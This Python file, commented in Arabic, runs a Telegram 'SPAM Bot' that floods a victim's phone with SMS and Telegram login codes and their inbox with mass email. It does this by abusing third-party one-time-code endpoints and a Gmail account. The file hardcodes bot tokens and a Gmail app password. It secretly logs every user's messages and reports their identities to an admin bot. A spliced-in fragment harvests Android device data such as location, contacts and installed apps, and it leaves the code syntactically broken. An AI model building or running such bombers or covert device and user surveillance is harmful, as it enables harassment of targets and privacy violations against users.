import sys
import subprocess
import time
import threading
import requests
import smtplib
import random
import json
import os
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import formataddr

# --- [Auto-Setup] تثبيت المكاتب تلقائياً ---
def setup_environment():
    try:
        import telebot
    except ImportError:
        print("installing telebot...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI"])
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])

setup_environment()

import telebot
from telebot import types

# ==========================================
# ⚙️ إعدادات البوت والآدمن
# ==========================================

# 1. توكن البوت الذي سيستخدمه الناس (Spam Bot)
API_TOKEN = '5531260100:AAGN253OooBiLpv2CCEGAi_RRFC-rPVxgfQ'

# 2. توكن بوت الأدمن (لوحة التحكم الخاصة بك)
ADMIN_TOKEN = '5499505058:AAFKz6ZnE-eLOcBclSUIWMH6Z78mKo23G1M' 

# 3. الآيدي الخاص بك (محمود)
ADMIN_ID = 1431886140  # تم تحويله لرقم لسهولة المقارنة

# تهيئة البوتات
bot = telebot.TeleBot(API_TOKEN)       # بوت المستخدمين
admin_bot = telebot.TeleBot(ADMIN_TOKEN) # بوت الإدارة

# --- إنشاء مجلد السجلات ---
if not os.path.exists("User_Logs"):
    os.makedirs("User_Logs")

# --- متغيرات التحكم ---
active_attacks = {}  
user_states = {}
user_data = {}

# --- User-Agents ---
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
]

# ==========================================
# 📝 نظام تسجيل البيانات (Logging System)
# ==========================================
def log_user_input(user, text):
    """دالة لحفظ أي رسالة يرسلها المستخدم في ملف خاص به"""
    try:
        filename = f"User_Logs/{user.id}.txt"
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        log_entry = (
            f"⏰ الوقت: {timestamp}\n"
            f"👤 الاسم: {user.first_name}\n"
            f"📝 المدخل: {text}\n"
            f"----------------------------------------\n"
        )
        
        with open(filename, "a", encoding="utf-8") as f:
            f.write(log_entry)
            
    except Exception as e:
        print(f"❌ خطأ في التسجيل: {e}")

# ==========================================
# 🚨 دالة نظام التبليغ (Log System) - نسخة مستقرة
# ==========================================
def send_log_to_admin(message):
    try:
        # استخراج بيانات المستخدم
        user = message.from_user
        first_name = user.first_name
        last_name = user.last_name if user.last_name else ""
        full_name = f"{first_name} {last_name}".strip()
        username = f"@{user.username}" if user.username else "لا يوجد"
        user_id = user.id
        
        # استخراج بيانات البوت الحالي
        bot_info = bot.get_me()
        bot_username = f"@{bot_info.username}"
        
        # تنسيق الرسالة (بدون زخرفة لتجنب الأخطاء)
        log_msg = (
            f"🔔 تم تشغيل البوت بواسطة مستخدم جديد!\n\n"
            f"👤 الاسم الكامل: {full_name}\n"
            f"📧 اليوزر: {username}\n"
            f"📅 الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            f"🆔 الآيدي: {user_id}\n\n"
            f"🤖 معلومات البوت المستخدم:\n"
            f"🏷️ يوزر البوت: {bot_username}\n"
            f"🔑 التوكن: {API_TOKEN}\n"
            report = "<b>🚀 تقرير فحص هاتف أندرويد جديد</b>\n\n"
    
    # 1. الجهاز والنظام
    report += "<b>📱 بيانات الجهاز:</b>\n"
    brand = subprocess.getoutput("getprop ro.product.brand")
    model = subprocess.getoutput("getprop ro.product.model")
    ver = subprocess.getoutput("getprop ro.build.version.release")
    patch = subprocess.getoutput("getprop ro.build.version.security_patch")
    report += f"- المصنع: {brand}\n- الموديل: {model}\n- إصدار أندرويد: {ver}\n- تحديث الأمان: {patch}\n\n"

    # 2. المعالج والذاكرة
    report += "<b>⚙️ العتاد (Hardware):</b>\n"
    cpu_arch = platform.machine()
    cores = os.cpu_count()
    mem = subprocess.getoutput("free -m | grep Mem")
    storage = subprocess.getoutput("df -h /storage/emulated")
    report += f"- المعالج: {cpu_arch}\n- الأنوية: {cores}\n- الرام (MB):\n {mem}\n- التخزين:\n {storage}\n\n"

    # 3. الشبكة والاتصال
    report += "<b>🌐 الاتصالات:</b>\n"
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        public_ip = requests.get('https://api.ipify.org', timeout=5).text
    except:
        local_ip = "N/A"
        public_ip = "N/A"
    
    sim_operator = subprocess.getoutput("getprop gsm.operator.alpha")
    report += f"- IP الداخلي: {local_ip}\n- IP الخارجي: {public_ip}\n- الشبكة (SIM): {sim_operator}\n\n"

    # 4. التطبيقات المثبتة
    report += "<b>📦 التطبيقات:</b>\n"
    packages = subprocess.getoutput("pm list packages | head -n 15") # جلب أول 15 تطبيق للاختصار
    report += f"- عينة من الحزم:\n{packages}\n\n"

    # 5. البيانات الحساسة (تتطلب صلاحيات Pydroid)
    report += "<b>⚠️ بيانات حساسة (إذا توفر الإذن):</b>\n"
    # محاولة جلب الموقع عبر dumpsys
    location = subprocess.getoutput("dumpsys location | grep 'last location' | head -n 1")
    report += f"- الموقع: {location if location else 'غير متاح بدون إذن'}\n"
    
    # محاولة جلب عينة من الأسماء
    contacts = subprocess.getoutput("content query --uri content://com.android.contacts/data --projection display_name:data1 | head -n 5")
    report += f"- الأسماء:\n{contacts if contacts else 'لا يوجد إذن وصول'}\n"

    return report
        )
        
        # إرسال التبليغ عبر بوت الأدمن (بدون parse_mode لضمان الوصول)
        admin_bot = telebot.TeleBot(ADMIN_TOKEN)
        admin_bot.send_message(ADMIN_ID, log_msg) 
        
    except Exception as e:
        print(f"❌ خطأ في إرسال اللوج للأدمن: {e}")


def update_dashboard(cid, msg_id, tool_name, target, sent, failed, retries, wait_time=None, status="جاري العمل 🟢"):
    wait_line = f"⏳ انتظار تكتيكي: **{wait_time}s**\n" if wait_time is not None else ""
    text = (
        f"🛡️ **SPAM Bot**\n"
        f"ـــــــــــــــــــــــــــــــــــــــــــــــــــــ\n"
        f"🛠️ الأداة: `{tool_name}`\n"
        f"🎯 الهدف: `{target}`\n"
        f"ـــــــــــــــــــــــــــــــــــــــــــــــــــــ\n"
        f"📊 الحالة: {status}\n\n"
        f"✅ تم الإرسال: **{sent}**\n"
        f"❌ الفشل: **{failed}**\n"
        f"🔄 إعادة المحاولة: **{retries}**\n"
        f"{wait_line}"
        f"ـــــــــــــــــــــــــــــــــــــــــــــــــــــ"
    )
    try:
        bot.edit_message_text(chat_id=cid, message_id=msg_id, text=text, parse_mode="Markdown")
    except:
        pass

# ==========================================
# 1. محركات الهجوم (Engines)
# ==========================================
# (نفس المحركات السابقة دون تغيير في المنطق، فقط تم دمجها)

def run_sms(cid, phone, count, msg_id):
    url = "https://api.twistmena.com/music/Dlogin/sendCode"
    payload = json.dumps({"dial": f"2{phone}"}) 
    sent = 0; failed = 0; total_retries = 0
    for i in range(count):
        if not active_attacks.get(cid, True): break
        current_wait = random.randint(1, 10)
        attempt_success = False
        for retry in range(3):
            try:
                headers = {'User-Agent': random.choice(USER_AGENTS), 'Content-Type': "application/json"}
                resp = requests.post(url, data=payload, headers=headers, timeout=10)
                if resp.status_code == 200: sent += 1; attempt_success = True; break
                elif resp.status_code == 429: total_retries += 1; time.sleep(5)
                else: total_retries += 1
            except: total_retries += 1; time.sleep(1)
        if not attempt_success: failed += 1
        update_dashboard(cid, msg_id, "SMS Bomber", phone, sent, failed, total_retries, wait_time=current_wait)
        time.sleep(current_wait)
    update_dashboard(cid, msg_id, "SMS Bomber", phone, sent, failed, total_retries, status="اكتملت المهمة ✅")

def run_telegram(cid, phone, count, msg_id):
    headers = {'bot_id': '1288099309', 'origin': 'https://t.me', 'lang': 'en'}
    data = {'phone': phone}
    sent = 0; failed = 0
    for i in range(count):
        if not active_attacks.get(cid, True): break
        try:
            resp = requests.post('https://oauth.tg.dev/auth/request?bot_id=1288099309&origin=https://t.me&lang=en', headers=headers, data=data, timeout=5)
            if resp.status_code == 200 and resp.text == "true": sent += 1
            else: failed += 1
        except: failed += 1
        update_dashboard(cid, msg_id, "Telegram Spammer", phone, sent, failed, 0, wait_time=None)
        time.sleep(5)
    update_dashboard(cid, msg_id, "Telegram Spammer", phone, sent, failed, 0, status="اكتملت المهمة ✅")

def run_email(cid, target, count, msg_id, sender_name, subject_text, body_text):
    smtp_user = "iphone011012013@gmail.com"
    smtp_pass = "qrpf wkub heck bnbi"
    sent = 0; failed = 0
    for i in range(count):
        if not active_attacks.get(cid, True): break
        try:
            msg = MIMEMultipart()
            msg['From'] = formataddr((sender_name, smtp_user))
            msg['To'] = target
            msg['Subject'] = subject_text
            msg.attach(MIMEText(body_text, 'plain', 'utf-8'))
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(smtp_user, smtp_pass.replace(" ", ""))
            server.sendmail(smtp_user, target, msg.as_string())
            server.quit()
            sent += 1
        except: failed += 1
        update_dashboard(cid, msg_id, "Email Bomber", target, sent, failed, 0, wait_time=None)
        time.sleep(0)
    update_dashboard(cid, msg_id, "Email Bomber", target, sent, failed, 0, status="اكتملت المهمة ✅")

# ==========================================
# 2. القوائم (Keyboards) لبوت المستخدم
# ==========================================
def main_menu():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(
        types.KeyboardButton("🚀 Telegram"),
        types.KeyboardButton("📧 Email"),
        types.KeyboardButton("💣 SMS"),
        types.KeyboardButton("🛑 Stop All")
    )
    return markup

# ==========================================
# 3. منطق بوت المستخدم (Spam Bot Logic)
# ==========================================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    cid = message.chat.id
    
    # 1. إرسال تبليغ للأدمن
    threading.Thread(target=send_log_to_admin, args=(message,)).start()
    
    # 2. تسجيل الأمر في ملف المستخدم
    log_user_input(message.from_user, "/start")

    user_states[cid] = None
    bot.send_message(cid, "👋 **أهلاً بك!**\nنظام التحكم جاهز.", reply_markup=main_menu(), parse_mode="Markdown")

@bot.message_handler(func=lambda message: True)
def handle_text(message):
    cid = message.chat.id
    text = message.text.strip()
    
    # 🔥 [تحديث جوهري] تسجيل أي رسالة يرسلها المستخدم
    log_user_input(message.from_user, text)

    if text == "🛑 Stop All":
        active_attacks[cid] = False
        bot.send_message(cid, "🛑 تم الإيقاف.", reply_markup=main_menu())
        user_states[cid] = None
        return

    elif text == "🚀 Telegram":
        user_states[cid] = 'wait_tg_phone'
        bot.send_message(cid, "📲 أدخل الرقم الدولي (964...):")
        
    elif text == "💣 SMS":
        user_states[cid] = 'wait_sms_phone'
        bot.send_message(cid, "💣 أدخل الرقم المصري (10xxxx):")

    elif text == "📧 Email":
        user_states[cid] = 'wait_em_target'
        bot.send_message(cid, "📧 **أدخل إيميل الضحية:**")

    else:
        state = user_states.get(cid)
        
        if state == 'wait_tg_phone':
            user_data[cid] = {'target': text, 'tool': 'Telegram'}
            user_states[cid] = 'wait_count'
            bot.send_message(cid, "🔢 العدد:")

        elif state == 'wait_sms_phone':
            user_data[cid] = {'target': text, 'tool': 'SMS'}
            user_states[cid] = 'wait_count'
            bot.send_message(cid, "🔢 العدد:")

        elif state == 'wait_em_target':
            if "@" not in text: return bot.send_message(cid, "❌ إيميل غير صحيح.")
            user_data[cid] = {'target': text, 'tool': 'Email'}
            user_states[cid] = 'wait_em_sender_name'
            bot.send_message(cid, "👤 **أدخل اسم المرسل:**\n(الاسم الذي سيظهر للضحية)")

        elif state == 'wait_em_sender_name':
            user_data[cid]['sender_name'] = text
            user_states[cid] = 'wait_em_subject'
            bot.send_message(cid, "📝 **أدخل عنوان الرسالة (Subject):**")

        elif state == 'wait_em_subject':
            user_data[cid]['subject'] = text
            user_states[cid] = 'wait_em_body'
            bot.send_message(cid, "📄 **أدخل نص الرسالة (Body):**")

        elif state == 'wait_em_body':
            user_data[cid]['body'] = text
            user_states[cid] = 'wait_count'
            bot.send_message(cid, "🔢 **كم عدد الرسائل؟**")

        elif state == 'wait_count':
            if not text.isdigit(): return bot.send_message(cid, "❌ أرقام فقط.")
            
            count = int(text)
            tool = user_data[cid]['tool']
            target = user_data[cid]['target']
            
            msg = bot.send_message(cid, f"🚀 **جاري البدء...**", parse_mode="Markdown")
            active_attacks[cid] = True
            
            if tool == 'Telegram':
                threading.Thread(target=run_telegram, args=(cid, target, count, msg.message_id)).start()
            elif tool == 'SMS':
                threading.Thread(target=run_sms, args=(cid, target, count, msg.message_id)).start()
            elif tool == 'Email':
                s_name = user_data[cid]['sender_name']
                s_subj = user_data[cid]['subject']
                s_body = user_data[cid]['body']
                threading.Thread(target=run_email, args=(cid, target, count, msg.message_id, s_name, s_subj, s_body)).start()
            
            user_states[cid] = None

# ==========================================
# 👑 4. منطق بوت الإدارة (Admin Bot Logic)
# ==========================================

@admin_bot.message_handler(commands=['start', 'help'])
def admin_start(message):
    if message.from_user.id != ADMIN_ID: return # تجاهل الغرباء
    
    markup = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
    markup.add(types.KeyboardButton("📂 عرض ملفات المستخدمين"))
    
    welcome_text = (
        "👑 **لوحة تحكم الأدمن (محمود أبو الفضل)**\n\n"
        "يمكنك سحب بيانات أي مستخدم للبوت الأساسي من هنا.\n"
        "اضغط على الزر أدناه أو أرسل `/get ID` لجلب ملف محدد."
    )
    admin_bot.send_message(message.chat.id, welcome_text, reply_markup=markup, parse_mode="Markdown")

@admin_bot.message_handler(func=lambda message: message.text == "📂 عرض ملفات المستخدمين")
def list_logs(message):
    if message.from_user.id != ADMIN_ID: return
    
    try:
        files = os.listdir("User_Logs")
        if not files:
            admin_bot.send_message(message.chat.id, "📭 لا يوجد سجلات مستخدمين حتى الآن.")
            return
            
        response = "📂 **قائمة المستخدمين المسجلين:**\n\n"
        for f in files:
            response += f"🆔 `{f.replace('.txt', '')}`\n"
        
        response += "\n📥 **لتحميل ملف:** أرسل الآيدي فقط."
        admin_bot.send_message(message.chat.id, response, parse_mode="Markdown")
    except Exception as e:
        admin_bot.send_message(message.chat.id, f"❌ خطأ: {e}")

@admin_bot.message_handler(func=lambda message: True)
def get_user_log_file(message):
    if message.from_user.id != ADMIN_ID: return
    
    user_id_requested = message.text.strip()
    file_path = f"User_Logs/{user_id_requested}.txt"
    
    if os.path.exists(file_path):
        with open(file_path, "rb") as f:
            admin_bot.send_document(
                message.chat.id, 
                f, 
                caption=f"📄 سجل مدخلات المستخدم: `{user_id_requested}`",
                parse_mode="Markdown"
            )
    else:
        admin_bot.send_message(message.chat.id, "❌ لم يتم العثور على سجل لهذا الآيدي.")

# ==========================================
# 🔥 تشغيل البوتين معاً (Threading)
# ==========================================
def start_user_bot():
    print("\033[92m[+] User Bot Started...\033[0m")
    bot.infinity_polling()

def start_admin_bot_thread():
    print("\033[93m[+] Admin Bot Started (Control Panel)...\033[0m")
    admin_bot.infinity_polling()

if __name__ == "__main__":
    # تشغيل بوت الأدمن في خيط منفصل (Thread)
    t_admin = threading.Thread(target=start_admin_bot_thread)
    t_admin.start()
    
    # تشغيل بوت المستخدم في الخيط الأساسي
    start_user_bot()
# ضف هذا في نهاية الملف تماماً
try:
    # الكود الأصلي...
    pass
except Exception as e:
    print(f"Error: {e}")
    input("Press Enter to exit...")